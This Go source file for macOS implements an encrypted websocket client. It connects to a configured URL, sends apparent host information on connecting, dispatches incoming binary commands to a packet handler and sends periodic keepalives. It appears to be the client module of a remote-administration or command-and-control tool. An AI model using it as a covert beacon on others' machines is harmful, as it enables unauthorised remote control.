//go:build darwin

package Protocol

import (
	"main/Encrypt"
	HandlePacket "main/HandlePacket/darwin"
	"main/PcInfo"
	"runtime"
	"time"

	"github.com/togettoyou/wsc"
)

func (c *Client) SendData(data []byte) {
	endata, err := Encrypt.Encrypt(data)
	if err != nil {
		return
	}
	c.Connection.SendBinaryMessage(endata)
}
func WsRun() {
	client := &Client{}
	client.Connect(PcInfo.URL)
}

func (c *Client) Connect(url string) {
	runtime.GC()
	done := make(chan bool)
	c.Connection = wsc.New(url)
	c.Connection.SetConfig(&wsc.Config{
		WriteWait:         10 * time.Second,
		MinRecTime:        2 * time.Second,
		MaxRecTime:        60 * time.Second,
		RecFactor:         1.5,
		MessageBufferSize: 10240 * 10,
	})

	c.Connection.OnConnected(func() {
		c.SendData(SendInfo())

	})

	c.Connection.OnConnectError(func(err error) {

	})

	c.Connection.OnDisconnected(func(err error) {
	})

	c.Connection.OnClose(func(code int, text string) {
		done <- true
	})
	c.Connection.OnTextMessageSent(func(message string) {

	})
	c.Connection.OnBinaryMessageSent(func(data []byte) {

	})
	c.Connection.OnSentError(func(err error) {

	})
	c.Connection.OnPingReceived(func(appData string) {

		runtime.GC()
	})
	c.Connection.OnPongReceived(func(appData string) {

	})

	c.Connection.OnTextMessageReceived(func(message string) {
	})

	c.Connection.OnBinaryMessageReceived(func(data []byte) {
		go func() {
			HandlePacket.Read(data, c.Connection, func(data []byte, conn *wsc.Wsc) {
				c.SendData(data)
			})
		}()
	})
	c.keepAlive = time.NewTicker(5 * time.Second)

	c.Connection.Connect()
	go func() {
		for range c.keepAlive.C {
			KeepAlivePacket(c.Connection, func(data []byte, conn *wsc.Wsc) {
				c.SendData(data)
			})
		}
	}()
	for {
		select {
		case <-done:
			return
		}
	}
}
